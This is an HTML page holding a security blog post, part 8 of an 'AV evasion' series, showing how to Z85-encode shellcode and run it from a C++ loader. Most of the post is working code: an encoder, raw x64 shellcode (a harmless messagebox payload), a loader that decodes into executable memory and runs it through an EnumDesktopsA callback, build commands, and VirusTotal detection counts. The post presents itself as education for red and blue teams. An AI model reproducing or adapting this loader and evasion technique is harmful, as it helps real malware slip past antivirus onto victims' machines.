@@ -1,0 +1,865 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Malware AV evasion - part 8. Encode payload via Z85 algorithm. C++ example. - cocomelonc</title>
+<meta name="description" content="﷽">
+
+
+  <meta name="author" content="cocomelonc">
+  
+  <meta property="article:author" content="cocomelonc">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="cocomelonc">
+<meta property="og:title" content="Malware AV evasion - part 8. Encode payload via Z85 algorithm. C++ example.">
+<meta property="og:url" content="https://cocomelonc.github.io/malware/2022/07/30/malware-av-evasion-8.html">
+
+
+  <meta property="og:description" content="﷽">
+
+
+
+  <meta property="og:image" content="https://cocomelonc.github.io/assets/images/64/2022-07-31_16-39.png">
+
+
+
+  <meta name="twitter:site" content="@cocomelonc">
+  <meta name="twitter:title" content="Malware AV evasion - part 8. Encode payload via Z85 algorithm. C++ example.">
+  <meta name="twitter:description" content="﷽">
+  <meta name="twitter:url" content="https://cocomelonc.github.io/malware/2022/07/30/malware-av-evasion-8.html">
+
+  
+    <meta name="twitter:card" content="summary">
+    
+      <meta name="twitter:image" content="https://cocomelonc.github.io/assets/images/64/2022-07-31_16-39.png">
+    
+  
+
+  
+
+
+
+  <meta property="article:published_time" content="2022-07-30T03:00:00+00:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="https://cocomelonc.github.io/malware/2022/07/30/malware-av-evasion-8.html">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "cocomelonc",
+      "url": "https://cocomelonc.github.io/"
+    
+  }
+</script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+
+  <link href="/feed.xml" type="application/atom+xml" rel="alternate" title="cocomelonc Feed">
+
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single">
+    <nav class="skip-links">
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+        <a class="site-title" href="/">
+          cocomelonc
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/about/">about</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person" class="h-card">
+
+  
+    <div class="author__avatar">
+      <a href="https://cocomelonc.github.io/">
+        <img src="/assets/images/cat.png" alt="cocomelonc" itemprop="image" class="u-photo">
+      </a>
+    </div>
+  
+
+  <div class="author__content">
+    <h3 class="author__name p-name" itemprop="name">
+      <a class="u-url" rel="me" href="https://cocomelonc.github.io/" itemprop="url">cocomelonc</a>
+    </h3>
+    
+      <div class="author__bio p-note" itemprop="description">
+        <p>cybersec enthusiast. CTF player</p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+        
+          
+            <li><a href="mailto:cocomelonkz@gmail.com" rel="nofollow noopener noreferrer me"><i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span></a></li>
+          
+        
+          
+            <li><a href="https://twitter.com/cocomelonckz" rel="nofollow noopener noreferrer me"><i class="fab fa-twitter" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
+          
+        
+          
+            <li><a href="https://www.hackthebox.eu/profile/293150" rel="nofollow noopener noreferrer me"><i class="far fa-flag" aria-hidden="true"></i><span class="label">HackTheBox</span></a></li>
+          
+        
+          
+            <li><a href="https://tryhackme.com/p/cocomelonc" rel="nofollow noopener noreferrer me"><i class="far fa-flag" aria-hidden="true"></i><span class="label">TryHackMe</span></a></li>
+          
+        
+          
+            <li><a href="https://github.com/cocomelonc/" rel="nofollow noopener noreferrer me"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+          
+            <li><a href="https://www.linkedin.com/in/zhassulan-zhussupov-5a347419b/" rel="nofollow noopener noreferrer me"><i class="fab fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+  
+  </div>
+
+
+
+  <article class="page h-entry" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Malware AV evasion - part 8. Encode payload via Z85 algorithm. C++ example.">
+    <meta itemprop="description" content="﷽">
+    <meta itemprop="datePublished" content="2022-07-30T03:00:00+00:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title p-name" itemprop="headline">
+            <a href="https://cocomelonc.github.io/malware/2022/07/30/malware-av-evasion-8.html" class="u-url" itemprop="url">Malware AV evasion - part 8. Encode payload via Z85 algorithm. C++ example.
+</a>
+          </h1>
+          
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          3 minute read
+        
+      </span>
+    
+  </p>
+
+
+        </header>
+      
+
+      <section class="page__content e-content" itemprop="text">
+        
+        <p>﷽</p>
+
+<p>Hello, cybersecurity enthusiasts and white hackers!</p>
+
+<p><img src="/assets/images/64/2022-07-31_16-39.png" alt="av-evasion" class="img-responsive" /></p>
+
+<p>This article is the result of my own research into interesting trick: encoding payload via Z85.</p>
+
+<p>Since the methods of encrypting the payload with the <a href="https://github.com/cocomelonc/peekaboo/tree/aes">AES</a> and <a href="/tutorial/2021/09/04/simple-malware-av-evasion.html">XOR</a> algorithms and encoding (for example, with the base64 algorithm) have been studied with blue teamers quite well, the question arose to try to hide the payload in a non-standard way.</p>
+
+<h3 id="z85">Z85</h3>
+
+<p><em>Ascii85</em>, also called <em>Base85</em>, is a form of binary-to-text encoding used to communicate arbitrary binary data over channels that were designed to carry only English language human-readable text. <em>Z85</em> a format for representing binary data as printable text. <a href="https://rfc.zeromq.org/spec/32/">Z85</a> is a derivative of existing Ascii85 encoding mechanisms, modified for better usability, particularly for use in source code.</p>
+
+<h3 id="practical-example">practical example</h3>
+
+<p>Let’s go to look at a practical example. First of all encode our payload via Z85 (<code class="language-plaintext highlighter-rouge">encode.cpp</code>):</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;./z85.h&gt;
+#include &lt;./z85.c&gt;
+#include &lt;windows.h&gt;
+</span>
+<span class="kt">char</span><span class="o">*</span> <span class="nf">encode</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">src</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">)</span> <span class="p">{</span>
+   <span class="c1">// allocate output buffer (+1 for null terminating char)</span>
+   <span class="kt">char</span><span class="o">*</span> <span class="n">dest</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">Z85_encode_with_padding_bound</span><span class="p">(</span><span class="n">len</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+
+   <span class="k">if</span> <span class="p">(</span><span class="n">len</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">dest</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span> <span class="c1">// write null terminating char</span>
+      <span class="k">return</span> <span class="n">dest</span><span class="p">;</span>
+   <span class="p">}</span>
+
+   <span class="c1">// encode the input buffer, padding it if necessary</span>
+   <span class="n">len</span> <span class="o">=</span> <span class="n">Z85_encode_with_padding</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="n">dest</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
+
+   <span class="k">if</span> <span class="p">(</span><span class="n">len</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// something went wrong</span>
+      <span class="n">free</span><span class="p">(</span><span class="n">dest</span><span class="p">);</span>
+      <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+   <span class="p">}</span>
+
+   <span class="n">dest</span><span class="p">[</span><span class="n">len</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span> <span class="c1">// write null terminating char</span>
+
+   <span class="k">return</span> <span class="n">dest</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">payload</span><span class="p">[]</span> <span class="o">=</span>
+  <span class="s">"</span><span class="se">\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41</span><span class="s">"</span>
+  <span class="s">"</span><span class="se">\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60</span><span class="s">"</span>
+  <span class="s">"</span><span class="se">\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72</span><span class="s">"</span>
+  <span class="s">"</span><span class="se">\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac</span><span class="s">"</span>
+  <span class="s">"</span><span class="se">\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2</span><span class="s">"</span>
+  <span class="s">"</span><span class="se">\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48</span><span class="s">"</span>
+  <span class="s">"</span><span class="se">\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f</span><span class="s">"</span>
+  <span class="s">"</span><span class="se">\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49</span><span class="s">"</span>
+  <span class="s">"</span><span class="se">\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01</span><span class="s">"</span>
+  <span class="s">"</span><span class="se">\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01</span><span class="s">"</span>
+  <span class="s">"</span><span class="se">\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1</span><span class="s">"</span>
+  <span class="s">"</span><span class="se">\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41</span><span class="s">"</span>
+  <span class="s">"</span><span class="se">\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b</span><span class="s">"</span>
+  <span class="s">"</span><span class="se">\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58</span><span class="s">"</span>
+  <span class="s">"</span><span class="se">\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41</span><span class="s">"</span>
+  <span class="s">"</span><span class="se">\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7</span><span class="s">"</span>
+  <span class="s">"</span><span class="se">\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e</span><span class="s">"</span>
+  <span class="s">"</span><span class="se">\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83</span><span class="s">"</span>
+  <span class="s">"</span><span class="se">\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd</span><span class="s">"</span>
+  <span class="s">"</span><span class="se">\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0</span><span class="s">"</span>
+  <span class="s">"</span><span class="se">\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff</span><span class="s">"</span>
+  <span class="s">"</span><span class="se">\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e</span><span class="s">"</span>
+  <span class="s">"</span><span class="se">\x2e\x2e\x5e\x3d\x00</span><span class="s">"</span><span class="p">;</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+   <span class="kt">char</span><span class="o">*</span> <span class="n">str</span> <span class="o">=</span> <span class="n">encode</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">payload</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">));</span>
+   <span class="k">if</span> <span class="p">(</span><span class="n">str</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">str</span><span class="p">);</span>
+      <span class="n">free</span><span class="p">(</span><span class="n">str</span><span class="p">);</span>
+   <span class="p">}</span>
+   <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Then compile it:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>x86_64-w64-mingw32-g++ <span class="nt">-O2</span> encode.cpp <span class="nt">-o</span> encode.exe <span class="nt">-I</span>/usr/share/mingw-w64/include/ <span class="nt">-I</span>/home/cocomelonc/hacking/cybersec_blog/2022-07-29-malware-av-evasion-8 <span class="nt">-s</span> <span class="nt">-ffunction-sections</span> <span class="nt">-fdata-sections</span> <span class="nt">-Wno-write-strings</span> <span class="nt">-fno-exceptions</span> <span class="nt">-fmerge-all-constants</span> <span class="nt">-static-libstdc</span>++ <span class="nt">-static-libgcc</span> <span class="nt">-fpermissive</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/64/2022-07-31_16-54.png" alt="av-evasion" class="img-responsive" /></p>
+
+<p>and run:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">.</span><span class="n">\encode.exe</span><span class="w">
+</span></code></pre></div></div>
+
+<p><img src="/assets/images/64/2022-07-31_17-17.png" alt="av-evasion" class="img-responsive" /></p>
+
+<p>As usually, for simplicity I used <code class="language-plaintext highlighter-rouge">meow-meow</code> messagebox payload:</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">my_payload</span><span class="p">[]</span> <span class="o">=</span>
+  <span class="c1">// 64-bit meow-meow messagebox</span>
+  <span class="s">"</span><span class="se">\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41</span><span class="s">"</span>
+  <span class="s">"</span><span class="se">\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60</span><span class="s">"</span>
+  <span class="s">"</span><span class="se">\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72</span><span class="s">"</span>
+  <span class="s">"</span><span class="se">\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac</span><span class="s">"</span>
+  <span class="s">"</span><span class="se">\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2</span><span class="s">"</span>
+  <span class="s">"</span><span class="se">\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48</span><span class="s">"</span>
+  <span class="s">"</span><span class="se">\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f</span><span class="s">"</span>
+  <span class="s">"</span><span class="se">\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49</span><span class="s">"</span>
+  <span class="s">"</span><span class="se">\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01</span><span class="s">"</span>
+  <span class="s">"</span><span class="se">\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01</span><span class="s">"</span>
+  <span class="s">"</span><span class="se">\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1</span><span class="s">"</span>
+  <span class="s">"</span><span class="se">\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41</span><span class="s">"</span>
+  <span class="s">"</span><span class="se">\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b</span><span class="s">"</span>
+  <span class="s">"</span><span class="se">\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58</span><span class="s">"</span>
+  <span class="s">"</span><span class="se">\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41</span><span class="s">"</span>
+  <span class="s">"</span><span class="se">\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7</span><span class="s">"</span>
+  <span class="s">"</span><span class="se">\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e</span><span class="s">"</span>
+  <span class="s">"</span><span class="se">\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83</span><span class="s">"</span>
+  <span class="s">"</span><span class="se">\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd</span><span class="s">"</span>
+  <span class="s">"</span><span class="se">\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0</span><span class="s">"</span>
+  <span class="s">"</span><span class="se">\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff</span><span class="s">"</span>
+  <span class="s">"</span><span class="se">\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e</span><span class="s">"</span>
+  <span class="s">"</span><span class="se">\x2e\x2e\x5e\x3d\x00</span><span class="s">"</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>Then, in the next step we put this encoded payload to our “malware”. I took the technique of running payload from one of the <a href="/tutorial/2022/06/27/malware-injection-20.html">previous</a> articles:</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
+* hack.cpp
+* Z85 encode payload
+* author: @cocomelonc
+* https://cocomelonc.github.io/malware/2022/07/30/malware-av-evasion-8.html
+*/</span>
+<span class="cp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;./z85.h&gt;
+#include &lt;./z85.c&gt;
+#include &lt;windows.h&gt;
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+  <span class="n">BOOL</span> <span class="n">rv</span><span class="p">;</span>
+  <span class="n">HANDLE</span> <span class="n">th</span><span class="p">;</span>
+  <span class="n">DWORD</span> <span class="n">oldprotect</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+  <span class="kt">char</span> <span class="n">e_my_payload</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"2@78z1[C&amp;K*&gt;*fqf06%EFp/pd&gt;nhnL7nq*wNk1HPf7^pGGqxOd]I/ISTndSg4n&gt;?4Znhm]YjyJQsefEl{:QHJp.q:&amp;Wk#x*pI=7VYI:xJ%0NK2*Fqsg907.*VBz&lt;XJ=}(]:neKJUI:eyR0NP&gt;inDl^}l5NNQncdpog08%vZ]P&amp;r:QHJp.8Qv}[JGRGoE6)jiNJ02suYchkQn]4=$kEcIWScum2KqInDEg4l5L(4ncd76sv34}sZ19[l0lGSnq3mKk#N:vsv37[k1HOA&gt;$g{P%6njp.2KDn06S@kL]oV606T8oG^u:107X&amp;^laPHqrTnVPYwKXV3phn2Ma-:*!KUthc{dYY3v@3iBP]xE6ln2a09IQA*w/X$wP8=AzdNTfaPKVie?QD[00000"</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="n">d_my_payload</span><span class="p">[</span><span class="mi">314</span><span class="p">]</span> <span class="o">=</span> <span class="p">{};</span>
+  <span class="kt">size_t</span> <span class="n">d</span> <span class="o">=</span> <span class="n">Z85_decode_with_padding</span><span class="p">(</span><span class="n">e_my_payload</span><span class="p">,</span> <span class="n">d_my_payload</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">e_my_payload</span><span class="p">));</span>
+  <span class="n">LPVOID</span> <span class="n">mem</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">d_my_payload</span><span class="p">),</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
+  <span class="n">RtlMoveMemory</span><span class="p">(</span><span class="n">mem</span><span class="p">,</span> <span class="n">d_my_payload</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">d_my_payload</span><span class="p">));</span>
+  <span class="n">EnumDesktopsA</span><span class="p">(</span><span class="n">GetProcessWindowStation</span><span class="p">(),</span> <span class="p">(</span><span class="n">DESKTOPENUMPROCA</span><span class="p">)</span><span class="n">mem</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Many thanks to <a href="https://github.com/artemkin/z85">@artemkin</a> for real-worked C/C++ implementation, also encoding/decoding with padding.</p>
+
+<h3 id="demo">demo</h3>
+
+<p>Let’s go to see everything in action. Compile our “malware”:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>x86_64-w64-mingw32-g++ <span class="nt">-O2</span> hack.cpp <span class="nt">-o</span> hack.exe <span class="nt">-I</span>/usr/share/mingw-w64/include/ <span class="nt">-I</span>/home/cocomelonc/hacking/cybersec_blog/2022-07-29-malware-av-evasion-8 <span class="nt">-L</span>/usr/x86_64-w64-mingw32/lib/ <span class="nt">-s</span> <span class="nt">-ffunction-sections</span> <span class="nt">-fdata-sections</span> <span class="nt">-Wno-write-strings</span> <span class="nt">-fno-exceptions</span> <span class="nt">-fmerge-all-constants</span> <span class="nt">-static-libstdc</span>++ <span class="nt">-static-libgcc</span> <span class="nt">-fpermissive</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/64/2022-07-31_17-21.png" alt="av-evasion" class="img-responsive" /></p>
+
+<p>and run in our victim’s machine:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">.</span><span class="n">\hack.exe</span><span class="w">
+</span></code></pre></div></div>
+
+<p><img src="/assets/images/64/2022-07-31_17-32.png" alt="av-evasion" class="img-responsive" /></p>
+
+<p>As you can see, everything is work perfectly :)</p>
+
+<p>Let’s go to upload <code class="language-plaintext highlighter-rouge">hack.exe</code> to VirusTotal:</p>
+
+<p><img src="/assets/images/64/2022-07-31_17-34.png" alt="av-evasion" class="img-responsive" /></p>
+
+<p><strong>So, 14 of 70 AV engines detect our file as malicious.</strong></p>
+
+<p><a href="https://www.virustotal.com/gui/file/6345f46e33919dd1e0691508a1f705d33ed44aadbdd1bb01a15fdad628b29fca/detection">https://www.virustotal.com/gui/file/6345f46e33919dd1e0691508a1f705d33ed44aadbdd1bb01a15fdad628b29fca/detection</a></p>
+
+<p>if you remember, this technique without encoding showed the result <strong>16 of 66</strong>:</p>
+
+<p><img src="/assets/images/60/2022-06-27_14-37.png" alt="av-evasion" class="img-responsive" /></p>
+
+<p><a href="https://www.virustotal.com/gui/file/657ff9b6499f8eed373ac61bf8fc98257295869a833155f68b4d68bb6e565ca1/detection">https://www.virustotal.com/gui/file/657ff9b6499f8eed373ac61bf8fc98257295869a833155f68b4d68bb6e565ca1/detection</a></p>
+
+<p><strong>We have reduced the number of AV engines which detect our malware from 16 to 14</strong>!</p>
+
+<p>So it can be assumed that evasion works.</p>
+
+<p>I hope this post spreads awareness to the blue teamers of this interesting technique, and adds a weapon to the red teamers arsenal.</p>
+
+<p><a href="https://rfc.zeromq.org/spec/32/">Z85</a>  <br />
+<a href="https://github.com/artemkin/z85">https://github.com/artemkin/z85</a>  <br />
+<a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-enumdesktopsa">EnumDesktopsA</a>   <br />
+<a href="https://github.com/cocomelonc/meow/tree/master/2022-07-29-malware-av-evasion-8">source code in github</a></p>
+
+<blockquote>
+  <p>This is a practical case for educational purposes only.</p>
+</blockquote>
+
+<p>Thanks for your time happy hacking and good bye!
+<em>PS. All drawings and screenshots are mine</em></p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/tags/#evasion" class="page__taxonomy-item p-category" rel="tag">evasion</a><span class="sep">, </span>
+    
+      <a href="/tags/#malware" class="page__taxonomy-item p-category" rel="tag">malware</a><span class="sep">, </span>
+    
+      <a href="/tags/#red-team" class="page__taxonomy-item p-category" rel="tag">red team</a><span class="sep">, </span>
+    
+      <a href="/tags/#win32api" class="page__taxonomy-item p-category" rel="tag">win32api</a><span class="sep">, </span>
+    
+      <a href="/tags/#windows" class="page__taxonomy-item p-category" rel="tag">windows</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/categories/#malware" class="page__taxonomy-item p-category" rel="tag">malware</a>
+    
+    </span>
+  </p>
+
+
+        
+
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time class="dt-published" datetime="2022-07-30T03:00:00+00:00">July 30, 2022</time></p>
+
+      </footer>
+
+      <section class="page__share">
+  
+    <h4 class="page__share-title">Share on</h4>
+  
+
+  <a href="https://twitter.com/intent/tweet?via=cocomelonc&text=Malware+AV+evasion+-+part+8.+Encode+payload+via+Z85+algorithm.+C%2B%2B+example.%20https%3A%2F%2Fcocomelonc.github.io%2Fmalware%2F2022%2F07%2F30%2Fmalware-av-evasion-8.html" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fcocomelonc.github.io%2Fmalware%2F2022%2F07%2F30%2Fmalware-av-evasion-8.html" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
